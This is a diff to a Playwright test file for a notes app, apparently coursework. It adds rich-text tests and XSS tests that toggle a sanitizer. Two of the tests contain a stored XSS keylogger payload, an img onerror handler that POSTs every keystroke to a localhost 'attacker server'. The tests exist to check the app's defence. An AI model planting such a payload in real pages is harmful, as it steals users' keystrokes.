@@ -1,4 +1,6 @@
 import { test, expect } from '@playwright/test';
+import fs from 'fs';
+import path from 'path'
 
 // Force Playwright to wait up to 30 seconds for each test
 test.setTimeout(30000);
@@ -39,7 +41,7 @@ test.beforeEach(async ({ page }) => {
 });
 
 // ----------------------------------------------------
-// HW2 CARRY-OVER TESTS (Now they will work because we are logged in!)
+// HW2 CARRY-OVER TESTS
 // ----------------------------------------------------
 
 test('Should create a new note successfully', async ({ page }) => {
@@ -95,7 +97,7 @@ test('Should delete a note successfully', async ({ page }) => {
 // ----------------------------------------------------
 
 test('AI assistant generates text and appends to new note', async ({ page }) => {
-  // We are already logged in from the beforeEach block!
+
   
   // 1. Click the add_new_note button to open the new-note form
   await page.click('button[name="add_new_note"]');
@@ -117,4 +119,88 @@ test('AI assistant generates text and appends to new note', async ({ page }) => 
 
   // 6. Assert that within 30 seconds the input grew non-empty
   await expect(noteInput).not.toHaveValue('', { timeout: 30000 });
+});
+
+// ----------------------------------------------------
+// HW4: Rich Text & XSS Defense Tests
+// ----------------------------------------------------
+
+test('Should preserve rich-text rendering safely', async ({ page }) => {
+  // 1. Create a note with safe HTML using your app's specific locators
+  await page.click('button[name="add_new_note"]');
+  await page.fill('input[name="text_input_new_note"]', 'Hello <b>world</b>'); 
+  await page.click('button[name="text_input_save_new_note"]'); 
+
+  // 2. Wait for the note to appear and verify the HTML structure
+  const noteBody = page.locator('[data-testid="note_body"]').first();
+  
+  // Assert that the <b> tag was actually rendered as an HTML element
+  const boldElement = noteBody.locator('b');
+  await expect(boldElement).toHaveCount(1);
+  await expect(boldElement).toHaveText('world');
+});
+
+test('XSS works when sanitizer is OFF', async ({ page }) => {
+  // 1. Define the absolute path to the attacker server log in the root folder
+  const logPath = path.join(process.cwd(), '../keylog.txt');
+  
+  // 2. Reset the log file so we have a clean slate
+  fs.writeFileSync(logPath, '');
+
+  // 3. Toggle the sanitizer OFF
+  const toggleBtn = page.locator('[data-testid="sanitizer_toggle"]');
+  await expect(toggleBtn).toContainText('ON');
+  await toggleBtn.click();
+  await expect(toggleBtn).toContainText('OFF');
+
+  // 4. Inject the payload using your app's specific locators
+  const payload = 'Hack <img src="x" onerror="document.addEventListener(\'keydown\', (e) => fetch(\'http://localhost:4000/log\', { method: \'POST\', body: e.key }))" /> Test';
+  await page.click('button[name="add_new_note"]');
+  await page.fill('input[name="text_input_new_note"]', payload); 
+  await page.click('button[name="text_input_save_new_note"]');
+
+  // 5. Wait a moment for the image to fail loading and the onerror event to bind
+  await page.waitForTimeout(500);
+
+  // 6. Type some stolen keys
+  await page.keyboard.type('evil');
+
+  // 7. Wait a second for the background fetch() requests to reach the server
+  await page.waitForTimeout(1000);
+
+  // 8. Read the log file and assert the attack succeeded
+  const logContent = fs.readFileSync(logPath, 'utf8');
+  expect(logContent).toContain('e');
+  expect(logContent).toContain('v');
+  expect(logContent).toContain('i');
+  expect(logContent).toContain('l');
+});
+
+test('XSS is blocked when sanitizer is ON', async ({ page }) => {
+  // 1. Reset the log file again
+  const logPath = path.join(process.cwd(), '../keylog.txt');
+  fs.writeFileSync(logPath, '');
+
+  // 2. Verify the toggle is ON (it should be on by default after a page refresh/navigation)
+  const toggleBtn = page.locator('[data-testid="sanitizer_toggle"]');
+  await expect(toggleBtn).toContainText('ON');
+
+  // 3. Inject the exact same payload using your app's specific locators
+  const payload = 'Shield <img src="x" onerror="document.addEventListener(\'keydown\', (e) => fetch(\'http://localhost:4000/log\', { method: \'POST\', body: e.key }))" /> Test';
+  await page.click('button[name="add_new_note"]');
+  await page.fill('input[name="text_input_new_note"]', payload); 
+  await page.click('button[name="text_input_save_new_note"]');
+
+  // 4. Wait for render
+  await page.waitForTimeout(500);
+
+  // 5. Type some keys that should NOT be stolen
+  await page.keyboard.type('safe');
+
+  // 6. Wait to ensure no delayed network requests slip through
+  await page.waitForTimeout(1000);
+
+  // 7. Read the log file and assert the defense held (file should be empty)
+  const logContent = fs.readFileSync(logPath, 'utf8');
+  expect(logContent.trim()).toBe('');
 });
